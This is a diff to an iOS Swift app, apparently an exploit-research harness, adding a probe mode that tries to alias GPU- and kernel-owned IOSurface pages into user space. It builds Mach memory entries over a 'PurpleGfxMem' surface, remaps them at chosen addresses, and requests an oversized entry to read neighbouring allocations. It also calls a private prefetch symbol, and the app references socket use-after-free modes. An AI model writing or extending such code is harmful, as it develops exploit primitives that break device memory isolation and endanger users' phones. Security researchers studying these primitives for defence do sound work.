@@ -27,6 +27,7 @@ import Metal
 import VideoToolbox
 import CoreMedia
 import CoreVideo
+import IOSurface
 
 // AVE HEVC parameter-set probe results live at file scope: the VideoToolbox
 // output callback is a plain C function pointer and cannot capture context.
@@ -57,6 +58,10 @@ func cv_mach_vm_map(_ target: vm_map_t,
                     _ cur: vm_prot_t,
                     _ max: vm_prot_t,
                     _ inherit: vm_inherit_t) -> kern_return_t
+
+// Not declared in the public header, but exported and callable on iOS 27.0/27.0.1.
+@_silgen_name("IOSurfacePrefetchPages")
+func cv_IOSurfacePrefetchPages(_ buffer: IOSurfaceRef) -> kern_return_t
 
 @main
 struct AGXProbeApp: App {
@@ -175,6 +180,7 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--ane") { Task.detached { await self.runANEMode() }; return }
         if args.contains("--ave") { Task.detached { await self.runAVEMode() }; return }
         if args.contains("--mementry") { Task.detached { await self.runMemEntryMode() }; return }
+        if args.contains("--iosurfphys") { Task.detached { await self.runIOSurfPhysMode() }; return }
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
@@ -831,6 +837,165 @@ func runFuzzMode() async {
         let am = aptr.load(as: UInt32.self)
         emitBg(String(format: "[*] memalias marker base=0x%08x aliasAnywhere=0x%08x aliasFixed=0x%08x samePage=%@",
                       bm, alias, am, am == 0xC0FFEE27 ? "YES" : "no"))
+    }
+
+    // ---- IOSurface-backed external-object gate ------------------------------
+    // `--mementry` proved an unsigned app can make a memory entry over its own
+    // writable pages and alias them at a chosen VA (distinct VA, same physical
+    // page). That only wraps memory we already own. This asks whether the same
+    // construction wraps *kernel/GPU-owned* pages: create an IOSurface in the
+    // "PurpleGfxMem" region, make a memory entry over its base, and map that
+    // object a second time at an address we choose.
+    //
+    // Stages (each logged separately so a refusal is attributable):
+    //   A/C  create two surfaces - one GPU-region, one control - and record bases
+    //   1    write distinct markers through each surface's own mapping
+    //   2    memory entry over surface A's base at its exact alloc size -> kr
+    //   3    mach_vm_map that object FIXED at a reserved VA -> read-back
+    //   4    oversize memory entry (8x alloc) -> kr; if it succeeds, read across
+    //        the delta between A and C to test whether the entry wraps
+    //        neighbouring allocations
+    nonisolated func runIOSurfPhysMode() {
+        emitBg("[*] iosurfphys start: memory entry over an IOSurface base + distinct-VA alias")
+        let page = mach_vm_size_t(vm_page_size)
+
+        let common: [IOSurfacePropertyKey: Any] = [
+            .width: 64, .height: 2,
+            .pixelFormat: kCVPixelFormatType_32BGRA,
+            .bytesPerElement: 4, .bytesPerRow: 256,
+            .allocSize: Int(page * 2),
+        ]
+        var regionProps = common
+        regionProps[IOSurfacePropertyKey(rawValue: "IOSurfaceMemoryRegion")] = "PurpleGfxMem"
+
+        guard let surfA = IOSurfaceCreate(regionProps as CFDictionary) else {
+            emitBg("[-] iosurfphys: PurpleGfxMem surface refused (stage A)")
+            emitBg("=== iosurfphys done ===")
+            return
+        }
+        let baseA = UInt(bitPattern: IOSurfaceGetBaseAddress(surfA))
+        let allocA = IOSurfaceGetAllocSize(surfA)
+        emitBg(String(format: "[*] iosurfphys A(PurpleGfxMem) id=%u base=0x%llx alloc=0x%llx",
+                      IOSurfaceGetID(surfA), baseA, allocA))
+
+        guard let surfC = IOSurfaceCreate(common as CFDictionary) else {
+            emitBg("[-] iosurfphys: control surface refused (stage C)")
+            emitBg("=== iosurfphys done ===")
+            return
+        }
+        let baseC = UInt(bitPattern: IOSurfaceGetBaseAddress(surfC))
+        let allocC = IOSurfaceGetAllocSize(surfC)
+        emitBg(String(format: "[*] iosurfphys C(control)      id=%u base=0x%llx alloc=0x%llx",
+                      IOSurfaceGetID(surfC), baseC, allocC))
+        emitBg(String(format: "[*] iosurfphys |delta(A-C)| = 0x%llx (C is %@ A)",
+                              UInt64(abs(Int64(baseA) - Int64(baseC))),
+                              (Int64(baseC) - Int64(baseA)) >= 0 ? "above" : "below"))
+
+        // stage 1 - markers through each surface's own mapping
+        let srcA = UnsafeMutableRawPointer(bitPattern: baseA)
+        let srcC = UnsafeMutableRawPointer(bitPattern: baseC)
+        srcA?.storeBytes(of: UInt32(0xAAAA0001), as: UInt32.self)
+        srcC?.storeBytes(of: UInt32(0xBBBB0002), as: UInt32.self)
+        emitBg(String(format: "[*] iosurfphys stage1 marker A=0x%08x (read back 0x%08x) C=0x%08x (read back 0x%08x)",
+                      UInt32(0xAAAA0001), srcA?.load(as: UInt32.self) ?? 0,
+                      UInt32(0xBBBB0002), srcC?.load(as: UInt32.self) ?? 0))
+
+        // stage 2+3 - entry over A's base, then a FIXED alias of the object
+        var esz = mach_vm_size_t(allocA)
+        var entry: mach_port_t = 0
+        let krEntry = cv_make_memory_entry_64(mach_task_self_, &esz, mach_vm_offset_t(baseA),
+                                              vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                              &entry, 0)
+        emitBg(String(format: "[*] iosurfphys stage2 make_memory_entry_64(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
+                      esz, krEntry, krEntry, entry))
+        defer { if entry != 0 { mach_port_deallocate(mach_task_self_, entry) } }
+
+        if krEntry == KERN_SUCCESS && entry != 0 {
+            // reserve an address of our choosing, release it, then FIXED-map there
+            var slot: vm_address_t = 0
+            let skr = vm_allocate(mach_task_self_, &slot, vm_size_t(allocA), VM_FLAGS_ANYWHERE)
+            emitBg(String(format: "[*] iosurfphys stage3 reserve -> kr=%d (0x%x) slot=0x%llx",
+                          skr, skr, UInt64(slot)))
+            if skr == KERN_SUCCESS && slot != 0 {
+                vm_deallocate(mach_task_self_, slot, vm_size_t(allocA))
+            } else {
+                slot = 0
+            }
+
+            var addr = mach_vm_address_t(slot)
+            var fkr = cv_mach_vm_map(mach_task_self_, &addr, mach_vm_size_t(allocA), 0,
+                                     Int32(VM_FLAGS_FIXED), entry, 0, boolean_t(0),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     VM_INHERIT_NONE)
+            let fixedKR = fkr
+            if fkr != KERN_SUCCESS {
+                addr = 0
+                fkr = cv_mach_vm_map(mach_task_self_, &addr, mach_vm_size_t(allocA), 0,
+                                     Int32(VM_FLAGS_ANYWHERE), entry, 0, boolean_t(0),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     VM_INHERIT_NONE)
+                emitBg(String(format: "[*] iosurfphys stage3 FIXED -> kr=%d (0x%x); ANYWHERE fallback -> kr=%d",
+                              fixedKR, fixedKR, fkr))
+            }
+            emitBg(String(format: "[*] iosurfphys stage3 mach_vm_map -> kr=%d (0x%x) at 0x%llx",
+                          fkr, fkr, addr))
+            if fkr == KERN_SUCCESS && addr != 0, let ap = UnsafeMutableRawPointer(bitPattern: UInt(addr)) {
+                let mSrc = srcA?.load(as: UInt32.self) ?? 0
+                let mAlias = ap.load(as: UInt32.self)
+                emitBg(String(format: "[*] iosurfphys stage3 marker source=0x%08x aliasFixed=0x%08x samePhysicalPage=%@",
+                              mSrc, mAlias, mAlias == mSrc && mSrc != 0 ? "YES" : "no"))
+                vm_deallocate(mach_task_self_, vm_address_t(addr), vm_size_t(allocA))
+            }
+        }
+
+        // stage 4 - oversize entry over the same base; does it wrap neighbours?
+        // NOTE: the kernel may clamp the requested size to the VM object's real
+        // extent, so every read below is bounds-checked against the size the
+        // call actually returned.
+        let requested = mach_vm_size_t(allocA * 8)
+        var bsz = requested
+        var bEntry: mach_port_t = 0
+        let krBig = cv_make_memory_entry_64(mach_task_self_, &bsz, mach_vm_offset_t(baseA),
+                                            vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                            &bEntry, 0)
+        emitBg(String(format: "[*] iosurfphys stage4 make_memory_entry_64(requested=0x%llx) -> kr=%d (0x%x) handle=0x%x returned=0x%llx clamped=%@",
+                      requested, krBig, krBig, bEntry, bsz,
+                      bsz != requested ? "YES" : "no"))
+        defer { if bEntry != 0 { mach_port_deallocate(mach_task_self_, bEntry) } }
+
+        if krBig == KERN_SUCCESS && bEntry != 0 {
+            var bAddr: mach_vm_address_t = 0
+            let bkr = cv_mach_vm_map(mach_task_self_, &bAddr, bsz, 0, Int32(VM_FLAGS_ANYWHERE),
+                                     bEntry, 0, boolean_t(0),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
+                                     VM_INHERIT_NONE)
+            emitBg(String(format: "[*] iosurfphys stage4 mach_vm_map -> kr=%d (0x%x) at 0x%llx",
+                          bkr, bkr, bAddr))
+            if bkr == KERN_SUCCESS && bAddr != 0, let bp = UnsafeMutableRawPointer(bitPattern: UInt(bAddr)) {
+                let w0 = bp.load(as: UInt32.self)
+                var off1 = "n/a (beyond mapping)"
+                if UInt64(allocA) + 4 <= bsz {
+                    off1 = String(format: "0x%08x", bp.advanced(by: Int(allocA)).load(as: UInt32.self))
+                }
+                let delta = Int64(baseC) - Int64(baseA)
+                var cross = "n/a (|delta| beyond mapping)"
+                if llabs(delta) + 4 <= Int64(bsz) {
+                    cross = String(format: "offset delta -> 0x%08x",
+                                   bp.advanced(by: Int(delta)).load(as: UInt32.self))
+                }
+                emitBg(String(format: "[*] iosurfphys stage4 oversize alias: off0=0x%08x off1alloc=%@ %@",
+                              w0, off1, cross))
+                vm_deallocate(mach_task_self_, vm_address_t(bAddr), vm_size_t(bsz))
+            }
+        }
+
+        // stage 5 - prefetch on the GPU-region surface
+        let pk = cv_IOSurfacePrefetchPages(surfA)
+        emitBg(String(format: "[*] iosurfphys stage5 IOSurfacePrefetchPages(A) -> kr=%d (0x%x)", pk, pk))
+        emitBg("=== iosurfphys done ===")
     }
 
     // ---- AVE / AppleAVE2 HEVC parameter-set encoder probe ------------------
